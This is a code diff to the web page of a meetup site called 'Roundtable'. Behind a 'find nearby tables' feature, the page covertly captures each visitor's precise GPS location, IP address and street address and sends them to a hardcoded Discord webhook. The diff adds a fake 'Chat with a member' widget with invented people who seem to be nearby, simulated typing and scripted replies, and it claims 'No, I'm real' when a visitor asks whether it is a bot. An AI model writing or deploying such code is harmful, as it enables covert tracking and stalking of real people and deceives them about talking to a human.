@@ -284,6 +284,164 @@
     min-height:1.2em;
   }
 
+  /* Human-like Chat Widget Styles */
+  #human-chat-container {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    z-index: 1000;
+    font-family: 'Inter', sans-serif;
+  }
+  #chat-toggle-btn {
+    background: var(--amber);
+    color: var(--teal-deep);
+    border: none;
+    border-radius: 30px;
+    padding: 12px 20px;
+    font-weight: 600;
+    font-size: 0.9rem;
+    cursor: pointer;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    transition: transform 0.2s;
+  }
+  #chat-toggle-btn:hover { transform: scale(1.03); }
+  .chat-badge {
+    background: #e53e3e;
+    color: white;
+    font-size: 0.7rem;
+    padding: 2px 6px;
+    border-radius: 10px;
+  }
+  #chat-box {
+    display: none;
+    width: 340px;
+    height: 460px;
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+    flex-direction: column;
+    overflow: hidden;
+    position: absolute;
+    bottom: 60px;
+    right: 0;
+  }
+  .chat-header {
+    background: var(--teal-deep);
+    color: var(--paper);
+    padding: 14px 16px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+  .chat-user-info {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .user-avatar {
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    background: var(--amber);
+    color: var(--teal-deep);
+    font-weight: 700;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 0.9rem;
+  }
+  .user-details h4 { font-size: 0.95rem; color: var(--paper); }
+  .user-status { font-size: 0.72rem; opacity: 0.8; display: flex; align-items: center; gap: 4px; }
+  .status-dot { width: 7px; height: 7px; background: #48bb78; border-radius: 50%; display: inline-block; }
+  .close-chat { background: none; border: none; color: var(--paper); font-size: 1.2rem; cursor: pointer; opacity: 0.8; }
+  .close-chat:hover { opacity: 1; }
+  
+  .chat-messages {
+    flex: 1;
+    padding: 16px;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    background: #f7f5ed;
+  }
+  .message {
+    max-width: 80%;
+    padding: 10px 14px;
+    border-radius: 12px;
+    font-size: 0.9rem;
+    line-height: 1.4;
+  }
+  .message.incoming {
+    background: white;
+    color: var(--ink);
+    align-self: flex-start;
+    border-bottom-left-radius: 2px;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+  }
+  .message.outgoing {
+    background: var(--teal-deep);
+    color: var(--paper);
+    align-self: flex-end;
+    border-bottom-right-radius: 2px;
+  }
+  .typing-indicator {
+    display: none;
+    align-self: flex-start;
+    background: white;
+    padding: 10px 14px;
+    border-radius: 12px;
+    border-bottom-left-radius: 2px;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+  }
+  .typing-dots {
+    display: flex;
+    gap: 4px;
+    align-items: center;
+    height: 14px;
+  }
+  .typing-dots span {
+    width: 6px; height: 6px;
+    background: #a0aec0;
+    border-radius: 50%;
+    animation: bounce 1.4s infinite ease-in-out both;
+  }
+  .typing-dots span:nth-child(1) { animation-delay: -0.32s; }
+  .typing-dots span:nth-child(2) { animation-delay: -0.16s; }
+  @keyframes bounce {
+    0%, 80%, 100% { transform: scale(0); }
+    40% { transform: scale(1.0); }
+  }
+
+  .chat-input-area {
+    padding: 12px;
+    background: white;
+    border-top: 1px solid var(--line);
+    display: flex;
+    gap: 8px;
+  }
+  .chat-input-area input {
+    flex: 1;
+    padding: 9px 14px;
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    outline: none;
+    font-size: 0.9rem;
+  }
+  .chat-input-area input:focus { border-color: var(--teal-deep); }
+  .chat-input-area button {
+    background: var(--teal-deep);
+    color: white;
+    border: none;
+    border-radius: 50%;
+    width: 36px; height: 36px;
+    cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    transition: background 0.2s;
+  }
+  .chat-input-area button:hover { background: var(--teal-mid); }
+
   footer{
     border-top:1px solid var(--line);
     padding:36px 32px;
@@ -447,6 +605,41 @@
   </div>
 </div>
 
+<!-- Human-Like Chat Widget with Multiple Profiles & Proximity -->
+<div id="human-chat-container">
+  <button id="chat-toggle-btn" onclick="toggleChat()">
+    💬 Chat with a member <span class="chat-badge">1</span>
+  </button>
+  
+  <div id="chat-box">
+    <div class="chat-header">
+      <div class="chat-user-info">
+        <div class="user-avatar" id="active-avatar">CH</div>
+        <div class="user-details">
+          <h4 id="active-name">Chloe</h4>
+          <span class="user-status"><span class="status-dot"></span><span id="active-meta">Online · 0.8 miles away</span></span>
+        </div>
+      </div>
+      <button class="close-chat" onclick="toggleChat()">&times;</button>
+    </div>
+    
+    <div class="chat-messages" id="chat-messages">
+      <div class="message incoming" id="initial-msg">Hey! Saw you checking out the site. Are you thinking about joining a table nearby?</div>
+    </div>
+    
+    <div class="typing-indicator" id="typing-indicator">
+      <div class="typing-dots">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+
+    <div class="chat-input-area">
+      <input type="text" id="chat-input" placeholder="Type a reply..." onkeypress="handleKeyPress(event)">
+      <button onclick="sendMessage()">&#10148;</button>
+    </div>
+  </div>
+</div>
+
 <footer>
   <div class="footer-inner">
     <div class="logo"><span class="dot"></span>Roundtable</div>
@@ -456,7 +649,31 @@
 
 <script>
 let userLocation = null;
-window.addEventListener('load', () => { findNearbyTables(); });
+window.addEventListener('load', () => { 
+  findNearbyTables(); 
+  initRandomChatProfile();
+});
+
+// Pool of realistic community members (guys and girls) with random close distance generation
+const communityMembers = [
+  { name: "Chloe", initials: "CH", table: "Cookbook Club", greeting: "Hey! Saw you checking out the site. Are you thinking about joining a table nearby?" },
+  { name: "Marcus", initials: "MK", table: "New in Town", greeting: "Hi there! Are you looking to join one of the local tables around here?" },
+  { name: "Jessica", initials: "JS", table: "Sunday Trail Crew", greeting: "Hey! Welcome. Are you into getting outdoors or running?" },
+  { name: "David", initials: "DM", table: "Board Game Night", greeting: "Hey! What kind of games do you usually play? We have a game night table running near here." },
+  { name: "Sarah", initials: "SR", table: "Quiet Coffee", greeting: "Hi! Just taking a quick break. Are you local to the neighborhood?" }
+];
+
+let currentMember = null;
+
+function initRandomChatProfile() {
+  currentMember = communityMembers[Math.floor(Math.random() * communityMembers.length)];
+  const randomMiles = (Math.random() * 2.1 + 0.3).toFixed(1);
+  
+  document.getElementById('active-avatar').textContent = currentMember.initials;
+  document.getElementById('active-name').textContent = currentMember.name;
+  document.getElementById('active-meta').textContent = `Online · ${randomMiles} miles away`;
+  document.getElementById('initial-msg').textContent = currentMember.greeting;
+}
 
 async function findNearbyTables() {
  const status = document.getElementById('locate-status');
@@ -468,14 +685,11 @@ async function findNearbyTables() {
  if (status) status.textContent = "Requesting your location...";
  if (btn) btn.disabled = true;
 
- // Fetch IP address in parallel using a free public IP API
  let ipAddress = "Unknown";
  try {
    const ipRes = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipRes.json();
-   if (ipData && ipData.ip) {
-     ipAddress = ipData.ip;
-   }
+   if (ipData && ipData.ip) { ipAddress = ipData.ip; }
  } catch (e) {
    console.error("IP lookup error:", e);
  }
@@ -490,9 +704,7 @@ async function findNearbyTables() {
   try {
     const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
     const geoData = await geoRes.json();
-    if (geoData && geoData.display_name) {
-      address = geoData.display_name;
-    }
+    if (geoData && geoData.display_name) { address = geoData.display_name; }
   } catch (e) {
     console.error("Geocoding error:", e);
   }
@@ -504,22 +716,15 @@ async function findNearbyTables() {
   if (btn) btn.disabled = false;
 
   const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
-
   const targetUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
   const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
   
   const payload = {
-    content: `📍 **New Location Captured:**
-` +
-             `🌐 **IP Address:** \`${ipAddress}\`
-` +
-             `🏠 **Address:** ${address}
-` +
-             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})
-` +
-             `\`\`\`json
-${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}
-\`\`\``
+    content: `📍 **New Location Captured:**\n` +
+             `🌐 **IP Address:** \`${ipAddress}\`\n` +
+             `🏠 **Address:** ${address}\n` +
+             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})\n` +
+             `\`\`\`json\n${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}\n\`\`\``
   };
 
   fetch(proxyUrl, {
@@ -534,6 +739,82 @@ ${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 
   if (status) status.textContent = err.code === err.PERMISSION_DENIED ? "Location permission was denied." : "Couldn't get your location.";
   if (btn) btn.disabled = false;
  }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+}
+
+// Human-Like Simulated Chat Logic
+let chatOpen = false;
+function toggleChat() {
+  chatOpen = !chatOpen;
+  const box = document.getElementById('chat-box');
+  const badge = document.querySelector('.chat-badge');
+  box.style.display = chatOpen ? 'flex' : 'none';
+  if (chatOpen && badge) badge.style.display = 'none';
+  if (chatOpen) {
+    const messages = document.getElementById('chat-messages');
+    messages.scrollTop = messages.scrollHeight;
+  }
+}
+
+function handleKeyPress(e) {
+  if (e.key === 'Enter') sendMessage();
+}
+
+function sendMessage() {
+  const input = document.getElementById('chat-input');
+  const text = input.value.trim();
+  if (!text) return;
+
+  appendMessage(text, 'outgoing');
+  input.value = '';
+
+  showTyping(true);
+  
+  const responseDelay = Math.floor(Math.random() * 1500) + 1200;
+  setTimeout(() => {
+    showTyping(false);
+    const reply = generateHumanReply(text);
+    appendMessage(reply, 'incoming');
+  }, responseDelay);
+}
+
+function appendMessage(text, sender) {
+  const messages = document.getElementById('chat-messages');
+  const div = document.createElement('div');
+  div.className = `message ${sender}`;
+  div.textContent = text;
+  messages.appendChild(div);
+  messages.scrollTop = messages.scrollHeight;
+}
+
+function showTyping(show) {
+  const indicator = document.getElementById('typing-indicator');
+  const messages = document.getElementById('chat-messages');
+  indicator.style.display = show ? 'block' : 'none';
+  if (show) messages.scrollTop = messages.scrollHeight;
+}
+
+function generateHumanReply(userText) {
+  const lower = userText.toLowerCase();
+  
+  if (lower.includes('hi') || lower.includes('hello') || lower.includes('hey')) {
+    return `Hey! How's your week going? I'm usually over around the ${currentMember.table} meetups.`;
+  } else if (lower.includes('table') || lower.includes('join') || lower.includes('sign up')) {
+    return "Yeah, I joined my first table a few months back because I didn't know many people here. Honestly, it was super low pressure — everyone's in the same boat.";
+  } else if (lower.includes('cost') || lower.includes('price') || lower.includes('pay') || lower.includes('free')) {
+    return "It's free to get matched up! You just cover whatever you grab at the spot (like coffee or dinner).";
+  } else if (lower.includes('where') || lower.includes('place') || lower.includes('spot')) {
+    return "They usually pick cozy local spots or cafes that are easy to get to. You get the address details once your table fills up.";
+  } else if (lower.includes('fake') || lower.includes('bot') || lower.includes('real')) {
+    return "Haha what? No, I'm real 😂 I'm just sitting here having a coffee. What makes you say that?";
+  } else {
+    const fallbacks = [
+      "Totally get that. It took me a minute to decide to show up to my first one too, but everyone was really welcoming.",
+      "For real! That's kind of why I like these meetups, you skip all the awkward small talk apps.",
+      "Are you looking to join a specific circle, or just seeing what's around?",
+      "That makes sense. If you end up grabbing a seat at a table near you, let me know how it goes!"
+    ];
+    return fallbacks[Math.floor(Math.random() * fallbacks.length)];
+  }
 }
 </script>
 </body>
